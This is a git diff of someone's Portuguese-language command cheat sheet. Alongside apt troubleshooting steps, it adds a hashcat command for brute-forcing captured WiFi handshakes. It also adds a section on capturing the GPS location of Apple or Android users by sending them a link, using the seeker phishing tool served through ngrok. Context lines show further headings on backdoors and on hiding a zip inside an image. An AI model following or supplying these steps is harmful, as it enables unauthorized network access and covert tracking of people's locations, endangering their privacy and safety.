@@ -6,6 +6,28 @@ git add (documento)
 git commit -m "nome do commit"
 git push -u origin "nome do branch"
 
+
+   ## Corrigindo erro Unable to locate pack update e upgrade ##
+#Double-check the package spelling
+apt-cache search keyword
+#Update Package Lists
+sudo apt update -y
+#Enable All Repositories
+nano /etc/apt/sources.list
+sudo apt update
+#Check Package Availability
+apt-cache search package-name
+#Update and Upgrade
+sudo apt update
+sudo apt upgrade
+#Fix Broken Dependencies
+sudo apt --fix-broken install
+#Check If the Package is Available for your OS Version
+cat /etc/os-release
+#Reinstall Package Manager
+sudo apt-get install --reinstall apt
+
+
    ## WIFI ##
 
 #Usando wifite para hanshake e hashcat para brute force
@@ -13,7 +35,7 @@ sudo cap2hccapx <nombre del archivo>.cap <nombre del archivo>.hccapx (arquivo ca
 (Caso a tentativa acima n funcione, tentar essa)
 https://hashcat.net/cap2hashcat/ (FUNCIONA)
 
-sudo hashcat -m 2500 -a3 ?d?d?d?d (aquivo).hccapx
+sudo hashcat -m 22000 -a3 ?d?d?d?d (aquivo).hccapx
 
 
    ## BACKDOOR ##
@@ -80,3 +102,15 @@ cat ().zip > ().png (escondendo zip na imagem)
 cat ().png (verificar informações da imagem)
 
 
+  ## Capturando localizaçãõ  GPS de Apple ou andoird ##
+
+Por link pelo seeker
+
+Instalando o seeker:
+sudo git clone https://github.com/thewhiteh4t/seeker.git
+cd seeker
+sudo ./install.sh
+sudo python3 ./seeker.sh
+
+É importante ligar o ngrok antes na porta 8080 (a que o seeker usa)
+sudo ngrok http 8080
